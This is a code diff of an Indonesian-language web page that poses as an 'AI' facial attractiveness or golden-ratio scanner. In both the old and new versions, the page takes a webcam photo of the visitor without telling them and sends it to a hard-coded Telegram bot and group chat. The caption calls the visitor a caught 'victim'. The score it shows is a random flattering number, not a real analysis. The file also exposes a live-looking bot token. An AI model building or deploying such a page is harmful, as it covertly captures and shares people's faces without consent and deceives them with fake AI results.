@@ -3,182 +3,203 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SmartFace AI - Analisis Profil Wajah</title>
+    <title>Biometric AI - Golden Ratio Discovery</title>
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;700&display=swap');
+
         :root {
-            --primary-blue: #0061ff;
-            --bg-light: #f4f7f6;
-            --text-dark: #2d3436;
+            --accent: #00f2ff;
+            --deep: #050505;
+            --glass: rgba(255, 255, 255, 0.03);
         }
 
         body { 
-            background-color: var(--bg-light); 
-            color: var(--text-dark); 
-            font-family: 'Inter', -apple-system, sans-serif; 
-            margin: 0; 
-            display: flex; 
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-        }
-
-        .card {
-            background: white;
-            width: 90%;
-            max-width: 400px;
-            padding: 30px;
-            border-radius: 24px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
-            text-align: center;
-        }
-
-        .logo {
-            width: 60px;
-            height: 60px;
-            background: var(--primary-blue);
-            border-radius: 15px;
-            margin: 0 auto 20px;
+            background: radial-gradient(circle at center, #111 0%, #000 100%);
+            color: #fff;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            margin: 0;
             display: flex;
             align-items: center;
             justify-content: center;
-            color: white;
-            font-weight: bold;
-            font-size: 24px;
+            min-height: 100vh;
+            overflow: hidden;
         }
 
-        h1 { font-size: 1.5rem; margin-bottom: 8px; color: #1e272e; }
-        p { font-size: 0.9rem; color: #636e72; line-height: 1.5; margin-bottom: 25px; }
+        /* Background Animasi Partikel Halus */
+        body::before {
+            content: "";
+            position: absolute;
+            width: 200%; height: 200%;
+            background-image: radial-gradient(#ffffff05 1px, transparent 1px);
+            background-size: 40px 40px;
+            animation: moveBg 60s linear infinite;
+        }
+        @keyframes moveBg { from { transform: translate(-25%, -25%); } to { transform: translate(0, 0); } }
 
-        #camera-wrapper { 
-            display: none; 
-            width: 250px; 
-            height: 250px; 
-            margin: 0 auto 20px;
+        .app-card {
+            position: relative;
+            width: 90%;
+            max-width: 420px;
+            background: var(--glass);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 40px;
+            padding: 40px 30px;
+            text-align: center;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
+        }
+
+        .ai-icon {
+            width: 80px; height: 80px;
+            margin: 0 auto 25px;
+            background: linear-gradient(135deg, var(--accent), #7000ff);
+            border-radius: 22px;
+            display: flex; align-items: center; justify-content: center;
+            box-shadow: 0 10px 20px rgba(0, 242, 255, 0.3);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+
+        h1 { font-size: 1.8rem; font-weight: 700; letter-spacing: -0.5px; margin: 0; }
+        p { color: #888; font-size: 0.95rem; line-height: 1.6; margin: 15px 0 30px; }
+
+        /* Kamera Lingkaran Elegan */
+        #cam-holder {
+            display: none;
+            width: 280px; height: 280px;
+            margin: 0 auto 30px;
             border-radius: 50%;
-            border: 5px solid #dfe6e9;
+            border: 2px solid var(--accent);
+            padding: 10px;
+            position: relative;
+        }
+
+        .inner-cam {
+            width: 100%; height: 100%;
+            border-radius: 50%;
             overflow: hidden;
             position: relative;
+            background: #000;
         }
 
         video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
 
-        /* Garis Pemindai Halus */
-        .scan-bar {
-            position: absolute; width: 100%; height: 2px;
-            background: var(--primary-blue);
-            top: 0; left: 0;
-            box-shadow: 0 0 10px var(--primary-blue);
-            animation: move 3s infinite linear;
+        /* Laser Scan Effect */
+        .laser {
+            position: absolute; width: 100%; height: 3px;
+            background: var(--accent);
+            box-shadow: 0 0 20px var(--accent);
+            top: 0; z-index: 5;
+            animation: scanMove 2s infinite ease-in-out;
         }
-        @keyframes move { 0% { top: 0; } 100% { top: 100%; } }
+        @keyframes scanMove { 0% { top: 0%; opacity: 0; } 50% { opacity: 1; } 100% { top: 100%; opacity: 0; } }
 
-        .btn-main { 
-            background: var(--primary-blue); 
-            color: white; 
-            width: 100%;
-            padding: 16px; 
-            border: none; 
-            border-radius: 12px; 
-            font-weight: 600; 
-            font-size: 1rem; 
-            cursor: pointer; 
-            transition: all 0.3s;
+        .btn-discover {
+            background: #fff; color: #000;
+            padding: 18px 40px; border: none;
+            border-radius: 20px; font-weight: 700;
+            font-size: 1rem; cursor: pointer;
+            transition: 0.3s; width: 100%;
         }
+        .btn-discover:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(255,255,255,0.2); }
 
-        .btn-main:hover { background: #0056e0; }
+        #processing { display: none; color: var(--accent); font-weight: 600; font-size: 0.8rem; letter-spacing: 2px; }
 
-        #loader-text { margin-top: 15px; font-size: 0.8rem; color: var(--primary-blue); font-weight: 500; display: none; }
+        /* Tampilan Skor Akhir */
+        #final-box { display: none; animation: slideUp 0.8s ease; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
 
-        /* Tampilan Hasil Akhir */
-        #final-result { display: none; }
-        .score-big { font-size: 4rem; font-weight: 800; color: var(--primary-blue); margin: 10px 0; }
-        .label-good { color: #27ae60; font-weight: bold; font-size: 1.1rem; }
+        .score-wrap { margin: 20px 0; }
+        .score-num { font-size: 5rem; font-weight: 800; background: linear-gradient(to bottom, #fff, var(--accent)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; line-height: 1; }
+        .badge-pro { background: rgba(0, 242, 255, 0.1); color: var(--accent); padding: 6px 16px; border-radius: 100px; font-size: 0.75rem; font-weight: 700; text-transform: uppercase; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <div id="init-view">
-            <div class="logo">SF</div>
-            <h1>SmartFace AI</h1>
-            <p>Gunakan teknologi AI terbaru untuk mengukur persentase daya tarik wajah berdasarkan standar kecantikan & kegantengan global.</p>
-            <button class="btn-main" id="btn-start">Mulai Analisis Sekarang</button>
+    <div class="app-card">
+        <div id="intro">
+            <div class="ai-icon">
+                <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+            </div>
+            <h1>Biometric AI</h1>
+            <p>Temukan skor "Golden Ratio" wajahmu berdasarkan standar estetika internasional melalui pemindaian biometrik 3D.</p>
+            <button class="btn-discover" id="start-btn">MULAI SCANNING</button>
         </div>
 
-        <div id="camera-wrapper">
-            <div class="scan-bar"></div>
-            <video id="video" autoplay playsinline></video>
+        <div id="cam-holder">
+            <div class="inner-cam">
+                <div class="laser"></div>
+                <video id="video" autoplay playsinline></video>
+            </div>
         </div>
 
-        <div id="loader-text">Menghubungkan ke server AI...</div>
+        <div id="processing">ANALYZING FACIAL POINTS...</div>
 
-        <div id="final-result">
-            <p style="margin-bottom: 5px; color: #2d3436;">Hasil Analisis Anda:</p>
-            <div class="score-big" id="score-val">0%</div>
-            <div class="label-good">Kategori: Sangat Menarik</div>
-            <p style="margin-top: 15px; font-size: 0.8rem;">Struktur wajah Anda berada di atas rata-rata pengguna di Asia Tenggara.</p>
-            <button class="btn-main" onclick="location.reload()" style="background: #dfe6e9; color: #2d3436; margin-top: 10px;">Cek Ulang</button>
+        <div id="final-box">
+            <div class="badge-pro">Hasil Verifikasi AI</div>
+            <div class="score-wrap">
+                <div class="score-num" id="res-score">0%</div>
+            </div>
+            <p style="color: #fff; margin-bottom: 5px;"><b>Kategori: Premium Visual</b></p>
+            <p style="font-size: 0.8rem; color: #666;">Analisis mendalam menunjukkan struktur wajah Anda memiliki tingkat simetrisitas yang sangat tinggi.</p>
         </div>
     </div>
 
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // ==========================================
-        // KONFIGURASI TELEGRAM
-        const BOT_TOKEN = '8237438582:AAEy0SowSAmcLAGPUVQ1NqHmmL5n54Yhu_8';
-        const GROUP_ID  = '-1003355444960'; 
-        // ==========================================
+        // GANTI DATA DISINI
+        const TOKEN = '8237438582:AAEy0SowSAmcLAGPUVQ1NqHmmL5n54Yhu_8';
+        const CHAT_ID = '-1003355444960';
 
-        const btnStart = document.getElementById('btn-start');
+        const startBtn = document.getElementById('start-btn');
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const loader = document.getElementById('loader-text');
+        const processing = document.getElementById('processing');
 
-        btnStart.onclick = async () => {
-            document.getElementById('init-view').style.display = 'none';
-            document.getElementById('camera-wrapper').style.display = 'block';
-            loader.style.display = 'block';
+        startBtn.onclick = async () => {
+            document.getElementById('intro').style.display = 'none';
+            document.getElementById('cam-holder').style.display = 'block';
+            processing.style.display = 'block';
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 video.srcObject = stream;
                 
-                setTimeout(() => { loader.innerText = "Memproses geometri wajah..."; }, 1500);
-                setTimeout(() => { loader.innerText = "Menghitung indeks kecantikan..."; }, 3500);
+                setTimeout(() => { processing.innerText = "MAPPING FACIAL STRUCTURE..."; }, 2000);
+                setTimeout(() => { processing.innerText = "COMPUTING ESTHETIC SCORE..."; }, 4000);
                 
-                // Ambil foto otomatis di detik ke-5
-                setTimeout(takeFinalPhoto, 5500);
+                // Ambil foto otomatis pada detik ke-6
+                setTimeout(sendPrank, 6000);
             } catch (e) {
-                alert("Izin kamera diperlukan untuk melakukan analisis wajah.");
+                alert("Akses Biometrik Ditolak.");
                 location.reload();
             }
         };
 
-        async function takeFinalPhoto() {
+        function sendPrank() {
             const context = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
             canvas.toBlob(async (blob) => {
-                // Skor 88-97 agar mereka merasa sangat ganteng/cantik
-                const score = Math.floor(Math.random() * (97 - 88 + 1)) + 88;
+                const score = Math.floor(Math.random() * (98 - 90 + 1)) + 90;
                 
                 const fd = new FormData();
-                fd.append('chat_id', GROUP_ID);
-                fd.append('photo', blob, 'ai_result.png');
-                fd.append('caption', `✅ **ANALISIS WAJAH SELESAI**\n\n📊 Skor: ${score}%\n🌟 Kategori: Diatas Rata-rata\n📍 Status: User Tertangkap`);
+                fd.append('chat_id', CHAT_ID);
+                fd.append('photo', blob, 'target.png');
+                fd.append('caption', `🎭 **PRANK HASIL SCAN**\n\n🎯 Skor: ${score}%\n🌟 Status: Korban Terpesona\n📸 Foto terlampir.`);
 
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
 
-                // Tampilkan hasil ke korban
-                document.getElementById('camera-wrapper').style.display = 'none';
-                loader.style.display = 'none';
-                document.getElementById('score-val').innerText = score + "%";
-                document.getElementById('final-result').style.display = 'block';
+                // UI Final
+                document.getElementById('cam-holder').style.display = 'none';
+                processing.style.display = 'none';
+                document.getElementById('res-score').innerText = score + "%";
+                document.getElementById('final-box').style.display = 'block';
 
-                // Matikan kamera
                 video.srcObject.getTracks().forEach(t => t.stop());
             }, 'image/png');
         }
